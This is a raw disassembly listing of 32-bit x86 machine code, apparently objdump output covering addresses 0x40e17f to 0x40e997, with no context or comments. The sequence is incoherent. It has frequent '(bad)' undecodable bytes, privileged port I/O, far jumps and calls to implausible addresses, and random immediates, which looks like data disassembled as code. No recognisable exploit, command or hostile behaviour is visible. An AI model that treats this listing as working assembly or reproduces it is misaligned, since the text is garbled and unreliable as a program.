  40e17f:	shl    ch,1
  40e181:	(bad)  
  40e182:	sar    DWORD PTR [ebp+0xcafcbf],1
  40e188:	int    0xec
  40e18a:	rol    DWORD PTR [edx],1
  40e18c:	mul    ah
  40e18e:	clc    
  40e18f:	ror    al,0x8
  40e192:	pavgb  mm4,mm7
  40e195:	push   cs
  40e196:	ror    al,0xac
  40e199:	call   0xca28ae5f
  40e19e:	aam    0xb0
  40e1a0:	imul   edx
  40e1a2:	xlat   BYTE PTR ds:[ebx]
  40e1a3:	(bad)  
  40e1a5:	mov    esp,0xddd0dad1
  40e1aa:	add    esp,edi
  40e1ac:	icebp  
  40e1ad:	(bad)  
  40e1ae:	in     al,0xe1
  40e1b0:	jecxz  0x40e18d
  40e1b2:	add    eax,esp
  40e1b4:	call   0xde06cbbc
  40e1b9:	retf   
  40e1ba:	mov    bl,0xe0
  40e1bc:	leave  
  40e1bd:	loope  0x40e192
  40e1bf:	(bad)  
  40e1c0:	in     al,0xdf
  40e1c2:	fsubp  st(1),st
  40e1c4:	shl    ebx,cl
  40e1c6:	clc    
  40e1c7:	mov    esp,0xddeed8f5
  40e1cc:	lock std 
  40e1ce:	(bad)  
  40e1d0:	retf   
  40e1d1:	aad    0x7
  40e1d3:	call   0xa820e6a4
  40e1d8:	mov    bl,0xb0
  40e1da:	test   al,0xee
  40e1dc:	jmp    0x40e18f
  40e1de:	(bad)  
  40e1e0:	hlt    
  40e1e1:	in     eax,dx
  40e1e2:	aad    0xd0
  40e1e4:	(bad)  [ecx-0x210d2123]
  40e1ea:	mov    esi,0xc4f2dbe0
  40e1ef:	loop   0x40e1d2
  40e1f1:	(bad)  
  40e1f2:	loope  0x40e1e8
  40e1f4:	sti    
  40e1f5:	or     eax,0xe7bfacd8
  40e1fa:	in     al,dx
  40e1fb:	shl    ebx,1
  40e1fd:	iret   
  40e1fe:	repnz in al,dx
  40e200:	mov    eax,0xdadabedb
  40e205:	mov    edx,0xf1dee9d0
  40e20a:	repz shl cl,cl
  40e20d:	rol    BYTE PTR [eax],1
  40e20f:	add    esp,edx
  40e211:	test   ecx,0xfac9c8dd
  40e217:	lds    edi,FWORD PTR [edx+esi*4-0xa553452]
  40e21e:	repz repz mov edx,0xbcb8fddf
  40e225:	mov    ecx,0x7b8f4d1
  40e22a:	in     eax,0xcd
  40e22c:	std    
  40e22d:	hlt    
  40e22e:	add    ebp,ebx
  40e230:	cli    
  40e231:	loop   0x40e231
  40e233:	or     cl,BYTE PTR [edi]
  40e235:	or     eax,0xb7c8d2ce
  40e23a:	(bad)  
  40e23b:	stos   DWORD PTR es:[edi],eax
  40e23c:	bnd jmp 0x40e20e
  40e23f:	in     al,0xb7
  40e241:	mov    bh,0xfe
  40e243:	fdiv   st,st(4)
  40e245:	mov    ah,0xfc
  40e247:	mov    ecx,0xf9cef0e2
  40e24c:	rcr    dh,0x1
  40e24f:	ret    
  40e250:	cmc    
  40e251:	add    DWORD PTR [edi],eax
  40e253:	ret    
  40e254:	in     eax,dx
  40e255:	loop   0x40e240
  40e257:	out    dx,eax
  40e258:	xlat   BYTE PTR ds:[ebx]
  40e259:	not    ebx
  40e25b:	lods   eax,DWORD PTR ds:[esi]
  40e25c:	in     eax,0xed
  40e25e:	loopne 0x40e257
  40e260:	repnz mov ecx,0xccc8b6d6
  40e266:	in     eax,dx
  40e267:	fnstcw WORD PTR [eax-0x338f921]
  40e26d:	(bad)  
  40e26e:	neg    dh
  40e270:	std    
  40e271:	out    dx,eax
  40e272:	fld    st(3)
  40e274:	out    dx,eax
  40e275:	retf   
  40e276:	fmul   st,st(4)
  40e278:	int    0xc6
  40e27a:	loop   0x40e25c
  40e27c:	jecxz  0x40e255
  40e27e:	out    0xd4,eax
  40e280:	mov    cl,0xc4
  40e282:	rcl    bl,cl
  40e284:	(bad)  
  40e286:	mov    ah,0xd3
  40e288:	mov    ecx,0xfae5cdb5
  40e28d:	loop   0x40e280
  40e28f:	(bad)  
  40e290:	clc    
  40e291:	(bad)  
  40e292:	cli    
  40e293:	std    
  40e294:	jmp    0x40e288
  40e296:	leave  
  40e297:	leave  
  40e298:	loop   0x40e242
  40e29a:	out    0xc9,al
  40e29c:	repnz (bad) 
  40e29e:	mov    edx,0xfef9d7c7
  40e2a3:	retf   0xddd5
  40e2a6:	mov    ah,0x1
  40e2a8:	fsubr  st(1),st
  40e2aa:	fidivr DWORD PTR [edi-0x1ff05fa]
  40e2b0:	loopne 0x40e27d
  40e2b2:	fld    st(7)
  40e2b4:	call   0xdfecb2a1
  40e2b9:	lds    esi,FWORD PTR [edi-0x4d1f0d1f]
  40e2bf:	call   0xc9f6b4bb
  40e2c4:	sar    al,cl
  40e2c6:	rcr    ch,cl
  40e2c8:	call   0xe501eaae
  40e2cd:	out    0x7,eax
  40e2cf:	fcompp 
  40e2d1:	por    mm7,mm6
  40e2d4:	repz out dx,al
  40e2d6:	iret   
  40e2d7:	les    esp,FWORD PTR [esi-0x4a161517]
  40e2dd:	lods   al,BYTE PTR ds:[esi]
  40e2de:	loopne 0x40e2db
  40e2e0:	mov    edx,0xcdfdfee4
  40e2e5:	repnz lock (bad) 
  40e2e9:	fstp   TBYTE PTR [eax+0x9f4ccd1]
  40e2ef:	(bad)  
  40e2f0:	or     esi,ebp
  40e2f2:	cld    
  40e2f3:	retf   0x700
  40e2f6:	psrlw  mm4,mm2
  40e2f9:	(bad)
  40e2fc:	jmp    0x40e2ea
  40e2fe:	idiv   BYTE PTR [ecx-0x3a283649]
  40e304:	std    
  40e305:	add    esi,edi
  40e307:	(bad)  
  40e309:	(bad)  
  40e30b:	shl    cl,1
  40e30d:	clc    
  40e30e:	mov    esp,0xe8bd01ff
  40e313:	(bad)  
  40e314:	or     cl,bl
  40e316:	fld    st(6)
  40e318:	test   eax,0xe9e6edb7
  40e31d:	(bad)
  40e320:	cli    
  40e321:	sti    
  40e322:	(bad)  
  40e323:	(bad)  
  40e325:	cli    
  40e326:	std    
  40e327:	(bad)  
  40e328:	out    0xff,eax
  40e32a:	int    0xfc
  40e32c:	in     al,0xe3
  40e32e:	fmul   DWORD PTR [edx]
  40e330:	or     bh,cl
  40e332:	push   cs
  40e333:	fdiv   st(0),st
  40e335:	add    dh,ch
  40e337:	ret    
  40e338:	in     eax,0xbd
  40e33a:	leave  
  40e33b:	ret    
  40e33c:	shl    ecx,cl
  40e33e:	fyl2xp1 
  40e340:	cmc    
  40e341:	fincstp 
  40e343:	enter  0xdcdc,0xfd
  40e347:	(bad)  
  40e348:	add    bh,dh
  40e34a:	(bad)  
  40e34b:	inc    BYTE PTR [ecx]
  40e34d:	neg    bh
  40e34f:	ret    0x7fb
  40e352:	cli    
  40e353:	jecxz  0x40e333
  40e355:	adc    bh,cl
  40e357:	test   eax,0xcbacacc8
  40e35c:	jecxz  0x40e346
  40e35e:	repnz clc 
  40e360:	hlt    
  40e361:	leave  
  40e362:	rcr    edx,cl
  40e364:	cli    
  40e365:	fmulp  st(1),st
  40e367:	(bad)  
  40e369:	out    0xdb,eax
  40e36b:	aam    0xe1
  40e36d:	add    esi,esi
  40e36f:	(bad)
  40e372:	clc    
  40e373:	leave  
  40e374:	pop    es
  40e375:	cli    
  40e376:	adc    esi,ebx
  40e378:	rcr    bh,0xb0
  40e37b:	repz rcl eax,1
  40e37e:	in     al,0xb1
  40e380:	shl    BYTE PTR [edi-0x152e0d17],0xc9
  40e387:	add    al,BYTE PTR [edi]
  40e389:	(bad)  
  40e38a:	mov    DWORD PTR [edx+edi*8],0xd604f0cb
  40e391:	retf   0xdf0f
  40e394:	fild   WORD PTR [esi]
  40e396:	enter  0xaae0,0xdf
  40e39a:	repnz shl ch,0xeb
  40e39e:	lods   al,BYTE PTR ds:[esi]
  40e39f:	retf   
  40e3a0:	in     al,0xdb
  40e3a2:	into   
  40e3a3:	mov    ah,0xc4
  40e3a5:	jmp    0xd7ee:0xf3d603f2
  40e3ac:	shl    ch,0xf6
  40e3af:	in     al,0xd5
  40e3b1:	hlt    
  40e3b2:	call   0xf953c18f
  40e3b7:	in     eax,dx
  40e3b8:	mov    ebp,0xecd3f1c0
  40e3bd:	out    0xc1,al
  40e3bf:	out    0xc7,al
  40e3c1:	out    0xe6,al
  40e3c3:	fbstp  TBYTE PTR [esp+ecx*8-0x32601ff]
  40e3ca:	(bad)  
  40e3cb:	aad    0xe7
  40e3cd:	cld    
  40e3ce:	rcl    ebp,0xc6
  40e3d1:	hlt    
  40e3d2:	push   cs
  40e3d3:	dec    BYTE PTR [esi]
  40e3d5:	(bad)  
  40e3d6:	icebp  
  40e3d7:	into   
  40e3d8:	rol    dl,1
  40e3da:	cmc    
  40e3db:	shl    esi,1
  40e3dd:	int3   
  40e3de:	call   0xf632b9ab
  40e3e3:	lock aam 0xde
  40e3e6:	ret    0xcebb
  40e3e9:	mov    ecx,0xebd003f1
  40e3ee:	fiadd  DWORD PTR [eax]
  40e3f0:	hlt    
  40e3f1:	jmp    0x944c100
  40e3f6:	shr    edx,cl
  40e3f8:	mov    eax,0xb4b3b6bd
  40e3fd:	out    dx,eax
  40e3fe:	lods   al,BYTE PTR ds:[esi]
  40e3ff:	in     al,dx
  40e400:	in     eax,0xd3
  40e402:	shr    edi,cl
  40e404:	sti    
  40e405:	in     al,dx
  40e406:	mov    esp,0xfeb5d8d0
  40e40b:	inc    dh
  40e40d:	sar    DWORD PTR [ebx+eax*8-0x11183b3f],cl
  40e414:	or     al,0xe4
  40e416:	add    cl,ah
  40e418:	ffree  st(2)
  40e41a:	imul   BYTE PTR [esp+ebp*8-0x5153b53]
  40e421:	stc    
  40e422:	mov    ecx,0xdee2f4e4
  40e427:	aad    0xf6
  40e429:	imul   esp
  40e42b:	idiv   esp
  40e42d:	fucomi st,st(1)
  40e42f:	out    0xe9,al
  40e431:	add    cl,bh
  40e433:	in     eax,0xe9
  40e435:	enter  0xdffa,0xf1
  40e439:	shl    BYTE PTR [ebx-0x94c3134],1
  40e43f:	(bad)  
  40e440:	leave  
  40e441:	(bad)  
  40e442:	lods   al,BYTE PTR ds:[esi]
  40e443:	mov    ecx,0xd3d7bacf
  40e448:	stc    
  40e449:	fild   WORD PTR [edx]
  40e44b:	loopne 0x40e410
  40e44d:	loop   0x40e420
  40e44f:	jecxz  0x40e411
  40e451:	fimul  WORD PTR [edx]
  40e453:	jmp    0x40e43d
  40e455:	rol    eax,0xc9
  40e458:	jmp    0xc202b226
  40e45d:	retf   
  40e45e:	test   al,0xb4
  40e460:	mov    ebx,0xbff9f7d8
  40e465:	mov    ch,0xde
  40e467:	mov    esi,0xf0e7edfe
  40e46c:	in     eax,0xdb
  40e46e:	aad    0xf0
  40e470:	aad    0xf
  40e472:	aad    0xdb
  40e474:	jmp    0x40e47d
  40e476:	(bad)  
  40e478:	mov    eax,0xf0eacbe6
  40e47d:	fcmovu st,st(1)
  40e47f:	loope  0x40e477
  40e481:	repz (bad) 
  40e483:	out    dx,eax
  40e484:	(bad)  
  40e485:	repnz fmul st,st(0)
  40e488:	icebp  
  40e489:	cmc    
  40e48a:	loopne 0x40e48f
  40e48c:	mov    esp,0x9ebdaf9
  40e491:	or     DWORD PTR [ecx],ecx
  40e493:	dec    ebp
  40e495:	jmp    0xd0ff9394
  40e49a:	jmp    0xb5da:0xe2cce7cb
  40e4a1:	out    dx,eax
  40e4a2:	rcl    eax,1
  40e4a4:	repnz repnz mov ecx,0xdd07f6e3
  40e4ab:	cmc    
  40e4ac:	les    ecx,FWORD PTR [edx]
  40e4ae:	idiv   ebp
  40e4b0:	jecxz  0x40e48c
  40e4b2:	aad    0xb
  40e4b4:	cld    
  40e4b5:	add    ebx,esp
  40e4b7:	in     eax,0xe8
  40e4b9:	shl    cl,cl
  40e4bb:	in     eax,0xe3
  40e4bd:	int3   
  40e4be:	fcmovne st,st(0)
  40e4c0:	mov    ah,0xf8
  40e4c2:	aam    0xd0
  40e4c4:	not    eax
  40e4c6:	into   
  40e4c7:	mov    esi,0xfcc3ec03
  40e4cc:	cld    
  40e4cd:	aad    0x7
  40e4cf:	ffree  st(5)
  40e4d1:	(bad)  
  40e4d2:	sti    
  40e4d3:	(bad)  
  40e4d4:	std    
  40e4d5:	add    cl,cl
  40e4d7:	test   eax,0xcdf0c1de
  40e4dc:	mov    dl,0xc8
  40e4de:	fnop   
  40e4e0:	call   0xda0aaf9e
  40e4e5:	mov    edx,0xdcc2d4cd
  40e4ea:	fcmovb st,st(0)
  40e4ec:	clc    
  40e4ed:	loopne 0x40e4c5
  40e4ef:	loopne 0x40e4f7
  40e4f1:	add    dh,bh
  40e4f3:	or     al,0xd9
  40e4f5:	fst    st(2)
  40e4f7:	stos   BYTE PTR es:[edi],al
  40e4f8:	leave  
  40e4f9:	scas   al,BYTE PTR es:[edi]
  40e4fa:	jmp    0x40e4c2
  40e4fc:	out    0xb7,eax
  40e4fe:	(bad)  
  40e4ff:	div    BYTE PTR [ecx+edi*4+0x3bfecc6]
  40e506:	loop   0x40e504
  40e508:	fistp  QWORD PTR [esi-0x20e402e]
  40e50e:	retf   0xd5c2
  40e511:	clc    
  40e512:	(bad)  
  40e513:	jecxz  0x40e4da
  40e515:	fucomi st,st(2)
  40e517:	mov    ebp,0xafd7eef1
  40e51c:	retf   
  40e51d:	lods   al,BYTE PTR ds:[esi]
  40e51e:	out    0xd4,al
  40e520:	jmp    0xdcdd:0xd3ddd7e8
  40e527:	(bad)  
  40e528:	(bad)  
  40e52a:	in     eax,0xf0
  40e52c:	mov    ebp,0xd8daffc0
  40e531:	jecxz  0x40e507
  40e533:	clc    
  40e534:	jmp    0xcfa8:0xd1ddfe0e
  40e53b:	loop   0x40e4f2
  40e53d:	retf   0xf4ee
  40e540:	in     al,0xd2
  40e542:	icebp  
  40e543:	fdivrp st(5),st
  40e545:	cld    
  40e546:	repz repnz loop 0x40e503
  40e54a:	in     al,dx
  40e54b:	mov    edi,0x7010bd4
  40e550:	shl    esp,0xe6
  40e553:	add    al,BYTE PTR [eax*1-0x5a4719f9]
  40e55a:	aad    0xf0
  40e55c:	out    dx,al
  40e55d:	fcmovne st,st(2)
  40e55f:	mov    cl,0xb4
  40e561:	stc    
  40e562:	cmc    
  40e563:	aam    0xbd
  40e565:	mov    cl,0xbb
  40e567:	cld    
  40e568:	call   0xc614a46a
  40e56d:	jmp    0xdfd6:0xec106c3
  40e574:	loop   0x40e54e
  40e576:	(bad)  
  40e577:	in     eax,dx
  40e578:	fcomip st,st(3)
  40e57a:	mov    esp,0xc0d2f0cd
  40e57f:	fcmove st,st(0)
  40e581:	(bad)  
  40e582:	out    dx,eax
  40e583:	jmp    0x40e544
  40e585:	xlat   BYTE PTR ds:[ebx]
  40e586:	iret   
  40e587:	(bad)  
  40e589:	cmc    
  40e58a:	out    0xdc,al
  40e58c:	or     ebx,ebx
  40e58e:	add    ah,dl
  40e590:	out    dx,eax
  40e591:	jmp    0xb0ce45f
  40e596:	add    eax,0xd6eee5d2
  40e59b:	mov    dh,0xf0
  40e59d:	shl    ebp,1
  40e59f:	rcl    ebx,1
  40e5a1:	aam    0xe8
  40e5a3:	(bad)  
  40e5a4:	jmp    0xf82eda76
  40e5a9:	clc    
  40e5aa:	fld    QWORD PTR [edi]
  40e5ac:	pop    es
  40e5ad:	cld    
  40e5ae:	stc    
  40e5af:	(bad)  
  40e5b0:	fucom  st(2)
  40e5b2:	add    al,0xe
  40e5b4:	or     bl,ah
  40e5b6:	(bad)  
  40e5b7:	loopne 0x40e579
  40e5b9:	vpaddusb ymm5,ymm4,ymm5
  40e5bd:	mov    cl,0xe2
  40e5bf:	shr    edi,cl
  40e5c1:	jmp    0x40e5ba
  40e5c3:	idiv   dh
  40e5c5:	std    
  40e5c6:	mov    ebp,0xf6f903c8
  40e5cb:	in     eax,0xf9
  40e5cd:	jecxz  0x40e5a6
  40e5cf:	(bad)  [ebx]
  40e5d1:	or     ch,dh
  40e5d3:	(bad)  
  40e5d4:	syscall 
  40e5d6:	add    al,0xeb
  40e5d8:	icebp  
  40e5d9:	rol    dl,1
  40e5db:	int3   
  40e5dc:	fadd   st(1),st
  40e5de:	enter  0xb6d0,0xb9
  40e5e2:	into   
  40e5e3:	mov    ebp,0xdff1bcdd
  40e5e8:	mov    edi,0xfee600fd
  40e5ed:	aad    0xdc
  40e5ef:	icebp  
  40e5f0:	out    0xe9,al
  40e5f2:	into   
  40e5f3:	add    ah,cl
  40e5f5:	out    dx,al
  40e5f6:	int    0xc4
  40e5f8:	repz enter 0xc9d1,0xce
  40e5fd:	loop   0x40e5b0
  40e5ff:	jmp    0x40e5c1
  40e601:	ror    esp,1
  40e603:	jmp    0xc90fe5f9
  40e608:	in     eax,dx
  40e609:	(bad)  
  40e60b:	loope  0x40e5cf
  40e60d:	in     eax,0xea
  40e60f:	cld    
  40e610:	or     edi,esi
  40e612:	out    0xf5,eax
  40e614:	retf   
  40e615:	push   cs
  40e616:	cld    
  40e617:	shl    BYTE PTR [eax-0x303d100d],cl
  40e61d:	aam    0xac
  40e61f:	cli    
  40e620:	enter  0xffb1,0xdb
  40e624:	stc    
  40e625:	(bad)  
  40e626:	mov    edx,0xe5f4dbf2
  40e62b:	neg    bl
  40e62d:	fld    DWORD PTR [edx]
  40e62f:	loop   0x40e601
  40e631:	add    al,BYTE PTR [eax*1-0x5202f71b]
  40e638:	fcomip st,st(6)
  40e63a:	mov    bh,0xb6
  40e63c:	repz mov bh,0xf7
  40e63f:	clc    
  40e640:	aad    0xfe
  40e642:	(bad)  
  40e644:	cli    
  40e645:	int    0xbf
  40e647:	in     al,dx
  40e648:	mov    dh,0xf9
  40e64a:	ret    0xe6f2
  40e64d:	mov    BYTE PTR ds:0xd8d5f4c4,0xc3
  40e654:	or     BYTE PTR [eax],cl
  40e656:	fisubr WORD PTR [ebx-0x522a2f22]
  40e65c:	enter  0xcde6,0xd9
  40e660:	loopne 0x40e65d
  40e662:	(bad)  
  40e663:	mov    eax,0xd1f7ded2
  40e668:	enter  0xcdf8,0xdd
  40e66c:	fsubr  st(6),st
  40e66e:	aad    0xd0
  40e670:	add    eax,0xdd50a09
  40e675:	in     al,0xe0
  40e677:	stos   DWORD PTR es:[edi],eax
  40e678:	mov    edi,0xc7d4c6c4
  40e67d:	out    0xb5,al
  40e67f:	mov    dl,0xef
  40e681:	in     eax,0xdb
  40e683:	int3   
  40e684:	in     al,0xcf
  40e686:	mov    ebp,0xbf0707c1
  40e68b:	jecxz  0x40e64f
  40e68d:	(bad)  
  40e68f:	add    esp,esp
  40e691:	rol    DWORD PTR [edx],0xa
  40e694:	cld    
  40e695:	add    eax,DWORD PTR ds:0xd2cde8aa
  40e69b:	jmp    0x40e674
  40e69d:	aam    0xd5
  40e69f:	cmc    
  40e6a0:	(bad)  
  40e6a1:	stc    
  40e6a2:	enter  0xcaf6,0xe2
  40e6a6:	sar    BYTE PTR [esi-0xc2f05fe],1
  40e6ac:	loope  0x40e66b
  40e6ae:	add    eax,0xcee9c1e0
  40e6b3:	lds    eax,FWORD PTR [eax]
  40e6b5:	add    DWORD PTR ds:0xc0eaf1cd,eax
  40e6bb:	(bad)
  40e6be:	mov    dl,0xea
  40e6c0:	retf   0xded5
  40e6c3:	sti    
  40e6c4:	jmp    0x40e695
  40e6c6:	mov    edi,0xccf1c3f0
  40e6cb:	fcomi  st,st(4)
  40e6cd:	jecxz  0x40e6a4
  40e6cf:	ret    0xe2fb
  40e6d2:	jecxz  0x40e6be
  40e6d4:	add    esi,ecx
  40e6d6:	pop    es
  40e6d7:	fnsave [ebx-0x15081e13]
  40e6dd:	(bad)
  40e6e0:	call   0xd02fb29c
  40e6e5:	retf   
  40e6e6:	mov    ebx,0xd101d9ed
  40e6eb:	cmc    
  40e6ec:	add    eax,0xe3f702e6
  40e6f1:	psubw  mm7,mm7
  40e6f4:	add    al,0x5
  40e6f6:	jmp    0xef12bfe7
  40e6fb:	mov    dh,0xe1
  40e6fd:	in     eax,0xfb
  40e6ff:	mov    ecx,0xd9b4e4eb
  40e704:	fild   WORD PTR [edx]
  40e706:	repz int 0xdc
  40e709:	(bad)  
  40e70a:	fucom  st(0)
  40e70c:	in     al,dx
  40e70d:	jecxz  0x40e6d1
  40e70f:	add    eax,0x8def607
  40e714:	(bad)  
  40e716:	retf   
  40e717:	(bad)  
  40e718:	in     al,dx
  40e719:	lock int 0xe9
  40e71c:	fsubr  st(1),st
  40e71e:	shr    esi,cl
  40e720:	fild   QWORD PTR [ebp-0xd11333b]
  40e726:	jecxz  0x40e704
  40e728:	sti    
  40e729:	aam    0xf9
  40e72b:	loopne 0x40e725
  40e72d:	ret    0xdfeb
  40e730:	retf   
  40e731:	fild   DWORD PTR ds:0xc9dbe501
  40e737:	call   0xbd05a7e8
  40e73c:	call   0xd127c902
  40e741:	mov    ah,0xb7
  40e743:	out    dx,eax
  40e744:	mov    ah,0xbb
  40e746:	call   0xd142c724
  40e74b:	fild   WORD PTR ds:0xd5c9daeb
  40e751:	jmp    0xbdea:0x2c8ffd6
  40e758:	ret    
  40e759:	lods   al,BYTE PTR ds:[esi]
  40e75a:	ret    
  40e75b:	repz out 0xca,eax
  40e75e:	mov    edx,0xd4c7cab9
  40e763:	icebp  
  40e764:	out    dx,eax
  40e765:	retf   0x1f4
  40e768:	out    dx,al
  40e769:	cli    
  40e76a:	lock xlat BYTE PTR ds:[ebx]
  40e76c:	(bad)  
  40e76d:	mov    ebp,0x2f7f7f8
  40e772:	inc    DWORD PTR [ecx]
  40e774:	jmp    0x40e768
  40e776:	or     eax,0xecebe1eb
  40e77b:	out    0xc0,al
  40e77d:	mov    dh,0xea
  40e77f:	mov    bl,0xe5
  40e781:	call   0xd7fbbe80
  40e786:	std    
  40e787:	loopne 0x40e77a
  40e789:	rol    BYTE PTR [eax],1
  40e78b:	fstp   st(4)
  40e78d:	out    0xc7,al
  40e78f:	pop    es
  40e790:	push   esi
  40e792:	add    eax,0xc8f9e0fa
  40e797:	lods   al,BYTE PTR ds:[esi]
  40e798:	mov    ebp,0xe5e9e7e1
  40e79d:	repnz mov bl,0xe9
  40e7a0:	mov    ah,0xfa
  40e7a2:	mov    ah,0xdb
  40e7a4:	clc    
  40e7a5:	cld    
  40e7a6:	cld    
  40e7a7:	mov    ecx,0xdef8b5e8
  40e7ac:	lock faddp st(3),st
  40e7af:	(bad)  
  40e7b0:	in     eax,0xf7
  40e7b2:	or     bh,ch
  40e7b4:	add    BYTE PTR [ebx],cl
  40e7b6:	std    
  40e7b7:	in     al,dx
  40e7b8:	lods   al,BYTE PTR ds:[esi]
  40e7b9:	mov    edi,0xadc4c6cb
  40e7be:	mov    bl,0xf8
  40e7c0:	mov    ebx,0xdbede9b6
  40e7c5:	std    
  40e7c6:	ret    0xc0d5
  40e7c9:	loopne 0x40e7a2
  40e7cb:	add    dl,dh
  40e7cd:	add    BYTE PTR [ecx],al
  40e7cf:	std    
  40e7d0:	in     al,0x4
  40e7d2:	loop   0x40e7dd
  40e7d4:	jmp    0xcda8:0xf3a7eefd
  40e7db:	(bad)  
  40e7dc:	aam    0xf2
  40e7de:	in     al,dx
  40e7df:	sti    
  40e7e0:	retf   0xfbeb
  40e7e3:	shl    BYTE PTR [ebp-0x9031c05],cl
  40e7e9:	mov    edi,0xc7fde5d5
  40e7ee:	mov    esp,0xc7f7bec6
  40e7f3:	or     esi,esp
  40e7f5:	add    al,0xf3
  40e7f7:	repz mov dl,0xa9
  40e7fa:	int    0xcc
  40e7fc:	ret    
  40e7fd:	mov    cl,0xf6
  40e7ff:	aam    0xcf
  40e801:	(bad)  
  40e802:	retf   
  40e803:	retf   0xf8b5
  40e806:	hlt    
  40e807:	mov    ebx,0xd0d0d6d8
  40e80c:	fucomp st(3)
  40e80e:	or     ch,al
  40e810:	(bad)  
  40e812:	mov    esp,0xe60bc5c8
  40e817:	scas   eax,DWORD PTR es:[edi]
  40e818:	mov    bl,0xbf
  40e81a:	mov    esi,0xe5f2c1d2
  40e81f:	mov    ebx,0xd0d4e7cb
  40e824:	clc    
  40e825:	mov    cl,0xbd
  40e827:	cli    
  40e828:	ret    0xdff2
  40e82b:	pop    es
  40e82c:	std    
  40e82d:	cli    
  40e82e:	stc    
  40e82f:	fisttp QWORD PTR [ebx]
  40e831:	retf   0xd809
  40e834:	adc    edi,edx
  40e836:	adc    eax,eax
  40e838:	(bad)  
  40e839:	in     al,dx
  40e83a:	repnz lock out 0xe7,al
  40e83e:	mov    ch,0xd6
  40e840:	int    0xe7
  40e842:	mov    ecx,0xe3b5ebd8
  40e847:	hlt    
  40e848:	ffree  st(3)
  40e84a:	cmc    
  40e84b:	mov    edi,0x50903c6
  40e850:	lock add esi,edx
  40e853:	or     al,0xd4
  40e855:	into   
  40e856:	or     ch,dh
  40e858:	mov    dl,0xe5
  40e85a:	mov    cl,0xbc
  40e85c:	jecxz  0x40e855
  40e85e:	int3   
  40e85f:	repz in al,0xd9
  40e862:	stc    
  40e863:	jmp    0x40e852
  40e865:	fstp   st(3)
  40e867:	mov    eax,0xf7dcb5fa
  40e86c:	add    esi,ebp
  40e86e:	cld    
  40e86f:	in     eax,0x5
  40e871:	(bad)  
  40e873:	or     al,0xc9
  40e875:	adc    ecx,DWORD PTR [esi]
  40e877:	fsubrp st(1),st
  40e879:	mov    esi,0xd3caf3d7
  40e87e:	(bad)  
  40e87f:	repz repz (bad) 
  40e882:	enter  0xbfd0,0xbd
  40e886:	mov    ah,0xd6
  40e888:	iret   
  40e889:	jecxz  0x40e881
  40e88b:	lock (bad) 
  40e88d:	cmc    
  40e88e:	icebp  
  40e88f:	lock or cl,BYTE PTR [edx]
  40e892:	retf   0xe4dc
  40e895:	adc    ecx,DWORD PTR [eax+edx*8]
  40e898:	shl    cl,cl
  40e89a:	lods   eax,DWORD PTR ds:[esi]
  40e89b:	cmc    
  40e89c:	icebp  
  40e89d:	leave  
  40e89e:	test   al,0xb7
  40e8a0:	ror    al,0xb6
  40e8a3:	(bad)  
  40e8a4:	shr    edi,cl
  40e8a6:	fcmovnbe st,st(7)
  40e8a8:	int3   
  40e8a9:	clc    
  40e8aa:	rol    eax,0x2
  40e8ad:	rol    BYTE PTR [edx],0xeb
  40e8b0:	add    ebp,esi
  40e8b2:	stc    
  40e8b3:	leave  
  40e8b4:	iret   
  40e8b5:	call   DWORD PTR [edx]
  40e8b7:	ret    
  40e8b8:	mov    cl,0xe1
  40e8ba:	mov    dh,0xf7
  40e8bc:	mov    bh,0xe8
  40e8be:	div    bh
  40e8c0:	jmp    0x3ee:0x3cbb9cb
  40e8c7:	dec    ch
  40e8c9:	add    eax,esi
  40e8cb:	hlt    
  40e8cc:	fxtract 
  40e8ce:	loop   0x40e8b6
  40e8d0:	loope  0x40e8d8
  40e8d2:	hlt    
  40e8d3:	int    0xfa
  40e8d5:	or     ebx,esi
  40e8d7:	stos   DWORD PTR es:[edi],eax
  40e8d8:	(bad)  
  40e8d9:	test   al,0xac
  40e8db:	lods   al,BYTE PTR ds:[esi]
  40e8dc:	int3   
  40e8dd:	mov    ah,0xea
  40e8df:	fsub   st,st(6)
  40e8e1:	retf   
  40e8e2:	mov    eax,0xc2e3d8cf
  40e8e7:	call   0xe748ded9
  40e8ec:	add    dl,al
  40e8ee:	shl    cl,1
  40e8f0:	or     al,cl
  40e8f2:	call   0xce4faddb
  40e8f7:	int    0xdd
  40e8f9:	bnd repz ret 0xf5b4
  40e8fe:	mov    bl,0xd8
  40e900:	mov    dl,0xf8
  40e902:	fcmovu st,st(7)
  40e904:	int3   
  40e905:	fsubr  st,st(0)
  40e907:	ret    
  40e908:	loope  0x40e8e8
  40e90a:	cmc    
  40e90b:	in     eax,0xe2
  40e90d:	repnz loopne 0x40e8e0
  40e910:	ffree  st(6)
  40e912:	pmullw mm1,QWORD PTR [esi]
  40e915:	std    
  40e916:	loopne 0x40e8d6
  40e918:	mov    esi,0xb4c7d7b0
  40e91d:	mov    ch,0xb1
  40e91f:	mov    bh,0xed
  40e921:	shr    cl,1
  40e923:	mov    ebp,0xf7faf3dc
  40e928:	cld    
  40e929:	fadd   QWORD PTR [ecx]
  40e92b:	fincstp 
  40e92d:	add    al,0x9
  40e92f:	aam    0xdd
  40e931:	loopne 0x40e917
  40e933:	loope  0x40e93c
  40e935:	push   es
  40e936:	shr    BYTE PTR [ebx-0x3d114840],0xb7
  40e93d:	(bad)  
  40e93e:	cmc    
  40e93f:	(bad)  
  40e940:	dec    ebp
  40e942:	fcmovnbe st,st(2)
  40e944:	mov    dh,0xd2
  40e946:	add    bh,dh
  40e948:	add    bh,bl
  40e94a:	ret    
  40e94b:	add    eax,0xf7f2fff8
  40e950:	add    bl,al
  40e952:	sti    
  40e953:	add    bh,dh
  40e955:	sti    
  40e956:	pop    es
  40e957:	out    dx,al
  40e958:	fsubr  st,st(7)
  40e95a:	mov    bl,0xce
  40e95d:	hlt    
  40e95e:	cmc    
  40e95f:	mov    edx,0xd0e9f8b7
  40e964:	xlat   BYTE PTR ds:[ebx]
  40e965:	mov    ebx,0xf9dbd5f1
  40e96a:	aad    0xbc
  40e96c:	(bad)  
  40e96d:	add    ah,dh
  40e96f:	out    0xe9,eax
  40e971:	fprem  
  40e973:	loop   0x40e969
  40e975:	(bad)  
  40e977:	mov    cl,0xd1
  40e979:	ret    
  40e97a:	lock out dx,al
  40e97c:	in     eax,dx
  40e97d:	int3   
  40e97e:	loopne 0x40e940
  40e980:	icebp  
  40e981:	in     eax,0xd9
  40e983:	repz in al,dx
  40e985:	mov    ebx,0xe2e802fb
  40e98a:	cld    
  40e98b:	fprem  
  40e98d:	fcmovb st,st(5)
  40e98f:	clc    
  40e990:	std    
  40e991:	iret   
  40e992:	add    eax,0xe6d3fefc
  40e997:	scas   al,BYTE PTR es:[edi]
